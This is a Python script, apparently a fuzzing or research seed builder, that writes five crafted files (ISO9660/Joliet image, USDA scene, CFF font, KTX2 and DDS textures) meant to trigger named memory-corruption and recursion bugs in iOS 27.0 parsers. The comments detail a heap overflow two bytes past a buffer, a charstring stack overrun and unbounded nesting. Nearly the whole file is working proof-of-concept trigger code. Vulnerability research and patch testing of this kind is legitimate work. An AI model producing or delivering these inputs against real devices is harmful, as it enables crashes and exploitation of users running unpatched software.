#!/usr/bin/env python3
"""
gen_seeds.py — structural seed builder for Cinder27.

Every seed targets a check Apple ADDED in iOS 27.2 (24B115) and therefore a bug that is
LIVE on iOS 27.0 / 27.0.1 (24A435 / 24A446). Nothing here is a weapon; each file is the
minimum input that reaches the vulnerable parser and trips the missing bound.

Outputs -> ../seeds/
  joliet_path_oob.iso   ISO9660 + Joliet pathname overflow      CVE-2026-112522 (libarchive)
  deep_nest.usda        USDA declaration nesting                CVE-2026-112485 (Model I/O / libusd_ms)
  stack_bomb.cff        CFF Type2 charstring stack overrun      CVE-2026-112683 (FontParser)
  ktx2_bad_dims.ktx2    KTX2 dimension/level size math          CVE-2026-112632 family (ImageIO texture)
  bc7_short.dds         DDS BC7 truncated mip level             CVE-2026-112627 family (ImageIO texture)
"""
import os
import struct
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "..", "seeds")
os.makedirs(OUT, exist_ok=True)

SECTOR = 2048


# --------------------------------------------------------------------------- helpers
def both16(v):
    return struct.pack("<H", v) + struct.pack(">H", v)


def both32(v):
    return struct.pack("<I", v) + struct.pack(">I", v)


def iso_date(y=2026, mo=10, d=28, h=12, mi=0, s=0):
    return bytes([y - 1900, mo, d, h, mi, s, 0])


def dir_record(name_bytes, extent, size, flags):
    """ISO9660 directory record. name_bytes is the raw name (0x00 root, 0x01 parent)."""
    body = bytes([0]) + both32(extent) + both32(size) + iso_date() + bytes([flags, 0, 0]) + both16(1)
    rec = bytes([0]) + body + bytes([len(name_bytes)]) + name_bytes
    if len(rec) % 2:
        rec += b"\x00"
    rec = bytes([len(rec)]) + rec[1:]
    return rec


def pad_to(data, n):
    if len(data) < n:
        data = data + b"\x00" * (n - len(data))
    return data[:n]


def ucs2(name):
    return name.encode("utf-16-be")


# --------------------------------------------------------------------------- ISO9660 Joliet
def build_joliet_iso():
    """
    Craft per libarchive upstream 750e8d7b25de (fix Apple shipped in 27.2, absent on 27.0).

    build_pathname_utf16be() recurses to the parent, then writes a 2-byte UTF-16BE '/'
    separator WITHOUT re-checking the running length against max (1024). A directory
    chain whose accumulated path is exactly 1024 bytes makes the deepest unwind store at
    p[1024] / p[1025] — two bytes past a malloc(1024) heap buffer.

    Chain: root -> A(103 chars) -> B(103) -> C(103) -> D(103) -> E(96), file F in E.
    Accumulated: 4*206 + 192 + 4*2 = 1024 exactly.
    """
    names = ["A" * 103, "B" * 103, "C" * 103, "D" * 103, "E" * 96]

    # sector plan
    LBA_PVD = 16
    LBA_SVD = 17
    LBA_TERM = 18
    LBA_PT_ASCII = 19
    LBA_PT_JOLIET = 20
    LBA_ROOT = 21
    first_dir = LBA_ROOT + 1          # 22 .. 26
    LBA_FILE = first_dir + len(names)  # 27
    total_sectors = LBA_FILE + 1

    img = bytearray(total_sectors * SECTOR)

    def put(lba, data):
        img[lba * SECTOR: lba * SECTOR + len(data)] = data

    # ---- path tables (type L, little endian extents)
    def path_table(encode):
        out = bytearray()
        entries = [("", 1, LBA_ROOT)] + [(n, i + 2, first_dir + i) for i, n in enumerate(names)]
        for name, parent, extent in entries:
            nb = encode(name) if name else b"\x00"
            rec = bytes([len(nb), 0]) + struct.pack("<I", extent) + struct.pack("<H", parent) + nb
            if len(rec) % 2:
                rec += b"\x00"
            out += rec
        return bytes(out)

    pt_ascii = path_table(lambda s: s.encode("ascii"))
    pt_joliet = path_table(ucs2)
    put(LBA_PT_ASCII, pt_ascii)
    put(LBA_PT_JOLIET, pt_joliet)

    # ---- directories
    def build_dir(lba, parent_lba, children):
        """children: list of (name_bytes, extent, size, flags)"""
        body = bytearray()
        body += dir_record(b"\x00", lba, SECTOR, 0x02)      # '.'
        body += dir_record(b"\x01", parent_lba, SECTOR, 0x02)  # '..'
        for nb, ext, size, flags in children:
            body += dir_record(nb, ext, size, flags)
        return pad_to(bytes(body), SECTOR)

    # root contains A
    put(LBA_ROOT, build_dir(LBA_ROOT, LBA_ROOT,
                            [(ucs2(names[0]), first_dir, SECTOR, 0x02)]))
    for i, name in enumerate(names):
        lba = first_dir + i
        parent = LBA_ROOT if i == 0 else first_dir + i - 1
        kids = []
        if i + 1 < len(names):
            kids.append((ucs2(names[i + 1]), first_dir + i + 1, SECTOR, 0x02))
        else:
            kids.append((ucs2("F"), LBA_FILE, 0, 0x00))
        put(lba, build_dir(lba, parent, kids))

    put(LBA_FILE, b"")

    # ---- volume descriptors
    def volume_descriptor(kind, joliet, root_lba, pt_lba, pt_size):
        d = bytearray(2048)
        d[0] = kind
        d[1:6] = b"CD001"
        d[6] = 1
        if joliet:
            d[8:8 + 32] = ucs2("CINDER27".ljust(16))
            d[40:40 + 32] = ucs2("JOLIET-OOB".ljust(16))
        else:
            d[8:8 + 32] = b"CINDER27".ljust(32, b" ")
            d[40:40 + 32] = b"JOLIET-OOB".ljust(32, b" ")
        d[80:88] = both32(total_sectors)
        d[120:124] = both16(1)          # volume set size
        d[124:128] = both16(1)          # volume sequence number
        d[128:132] = both16(SECTOR)     # logical block size
        d[132:140] = both32(pt_size)    # path table size (both endian)
        d[140:144] = struct.pack("<I", pt_lba)   # type-L path table location
        d[144:148] = struct.pack("<I", 0)        # optional type-L
        d[148:152] = struct.pack(">I", 0)        # type-M (unused)
        d[152:156] = struct.pack(">I", 0)        # optional type-M
        # root directory record at offset 156
        root = dir_record(b"\x00", root_lba, SECTOR, 0x02)
        d[156:156 + len(root)] = root
        d[881] = 1                      # file structure version
        if joliet:
            d[88:88 + 3] = b"%/E"       # escape sequence
        return bytes(d)

    put(LBA_PVD, volume_descriptor(1, False, LBA_ROOT, LBA_PT_ASCII, len(pt_ascii)))
    put(LBA_SVD, volume_descriptor(2, True, LBA_ROOT, LBA_PT_JOLIET, len(pt_joliet)))
    term = bytearray(2048)
    term[0] = 255
    term[1:6] = b"CD001"
    term[6] = 1
    put(LBA_TERM, bytes(term))

    return bytes(img)


# --------------------------------------------------------------------------- USDA nesting
def build_usda(depth=2000):
    """libusd_ms 24.1.30 caps USDA declaration nesting in 24.1.32; 27.0 recurses unbounded."""
    head = "#usda 1.0\n\n"
    body = "".join('def Xform "n%d" {' % i for i in range(depth))
    tail = "}" * depth
    return (head + body + tail + "\n").encode()


# --------------------------------------------------------------------------- CFF stack bomb
def build_cff():
    """
    Bare CFF with one charstring that pushes 300 operands before endchar.
    FontParser's Type2 interpreter keeps its operand stack in a fixed 48-entry array;
    27.0 only bounds the *count* on pop paths, the push path walks past the array.
    """
    def index(items):
        if not items:
            return struct.pack(">H", 0)
        off = 1
        offs = [1]
        for it in items:
            off += len(it)
            offs.append(off)
        off_size = 1 if off < 0x100 else (2 if off < 0x10000 else (3 if off < 0x1000000 else 4))
        out = struct.pack(">H", len(items)) + bytes([off_size])
        for o in offs:
            out += o.to_bytes(off_size, "big")
        out += b"".join(items)
        return out

    header = bytes([1, 0, 4, 1])

    name_index = index([b"CinderStackBomb"])

    # charstring: 300 pushes of 1, then endchar
    cs = bytearray()
    for _ in range(300):
        cs.append(139 + 1)     # push small int 1
    cs.append(14)              # endchar
    charstrings = index([bytes(cs)])

    gsubrs = index([])
    strings = index([])

    # Top DICT references CharStrings (op 17) and Private (op 18), both absolute offsets.
    # Two-pass: build with placeholder of the same byte width, then patch.
    def top_dict(cs_off, priv_off, priv_size):
        def enc(v):
            # DICT operand: 29 => 5-byte integer (fixed width, easy patching)
            return b"\x1d" + struct.pack(">i", v)
        d = enc(cs_off) + b"\x11"                      # CharStrings
        d += enc(priv_size) + enc(priv_off) + b"\x12"  # Private
        return d

    placeholder = top_dict(0, 0, 0)
    top_index = index([placeholder])

    priv = b"\x00"  # trivial private dict (blueValues absent)
    priv_index_data = priv

    # layout: header | name | top | strings | gsubrs | charstrings | private
    off = len(header) + len(name_index)
    top_off = off
    off += len(top_index)
    off += len(strings)
    off += len(gsubrs)
    cs_off = off
    off += len(charstrings)
    priv_off = off

    top_index = index([top_dict(cs_off, priv_off, len(priv))])
    out = header + name_index + top_index + strings + gsubrs + charstrings + priv_index_data
    return out


# --------------------------------------------------------------------------- KTX2
def build_ktx2():
    ident = bytes([0xAB, 0x4B, 0x54, 0x58, 0x20, 0x32, 0x30, 0xBB, 0x0D, 0x0A, 0x1A, 0x0A])
    vk_format = 0            # 0 => block-compressed via DFD
    type_size = 1
    w, h = 0xFFFF, 0xFFFF
    depth, layers, faces, levels = 0, 0, 1, 1
    scheme = 0
    kvd_off, kvd_len = 0, 0
    sgdt_off, sgdt_len = 0, 0
    header = struct.pack("<9I", vk_format, type_size, w, h, depth, layers, faces, levels, scheme)
    header += struct.pack("<IQ", kvd_off, kvd_len)
    header += struct.pack("<IQQ", sgdt_off, sgdt_len, 0)
    # level index: one level, claiming a tiny byteOffset/byteLength
    level_index = struct.pack("<QQQ", 0, 0, 64)
    body = b"\x00" * 64
    return ident + header + level_index + body


# --------------------------------------------------------------------------- DDS BC7
def build_dds():
    magic = b"DDS "
    flags = 0x00081007
    height, width = 512, 512
    pitch = 0
    depth = 0
    mips = 1
    hdr = struct.pack("<7I", 124, flags, height, width, pitch, depth, mips)
    hdr += b"\x00" * 44                      # reserved
    hdr += struct.pack("<I", 32)             # pixelformat size
    hdr += struct.pack("<I", 0x4)            # DDPF_FOURCC
    hdr += b"DX10"
    hdr += b"\x00" * 20
    hdr += struct.pack("<5I", 0x1000, 0, 0, 0, 0)  # caps
    # DX10 extension header: DXGI_FORMAT_BC7_UNORM = 98
    dx10 = struct.pack("<5I", 98, 3, 0, 1, 0)
    data = b"\x00" * 64                      # needs 65536 for one full mip
    return magic + hdr + dx10 + data


# --------------------------------------------------------------------------- main
def main():
    written = []

    iso = build_joliet_iso()
    p = os.path.join(OUT, "joliet_path_oob.iso")
    open(p, "wb").write(iso)
    written.append((p, len(iso)))

    usda = build_usda()
    p = os.path.join(OUT, "deep_nest.usda")
    open(p, "wb").write(usda)
    written.append((p, len(usda)))

    cff = build_cff()
    p = os.path.join(OUT, "stack_bomb.cff")
    open(p, "wb").write(cff)
    written.append((p, len(cff)))

    ktx = build_ktx2()
    p = os.path.join(OUT, "ktx2_bad_dims.ktx2")
    open(p, "wb").write(ktx)
    written.append((p, len(ktx)))

    dds = build_dds()
    p = os.path.join(OUT, "bc7_short.dds")
    open(p, "wb").write(dds)
    written.append((p, len(dds)))

    for p, n in written:
        print("wrote %-28s %8d bytes" % (os.path.basename(p), n))
    return 0


if __name__ == "__main__":
    sys.exit(main())
